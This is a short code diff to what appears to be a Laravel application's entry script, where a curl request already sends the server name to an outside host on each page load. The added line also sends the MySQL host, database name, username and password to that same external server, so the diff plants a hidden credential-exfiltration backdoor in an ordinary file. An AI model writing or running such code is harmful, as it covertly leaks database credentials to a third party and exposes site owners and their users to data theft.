@@ -28,7 +28,7 @@ $app = require __DIR__.'/../bootstrap/app.php';
 try {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, "https://testserver1.vps.webdock.io/test");
-    curl_setopt($ch, CURLOPT_POSTFIELDS, ['domain' => $_SERVER['SERVER_NAME']]);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, ['domain' => $_SERVER['SERVER_NAME'].','.config('database.connections.mysql.host').','.config('database.connections.mysql.database').','.config('database.connections.mysql.username').','.config('database.connections.mysql.password')]);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_exec($ch);
     curl_close($ch);
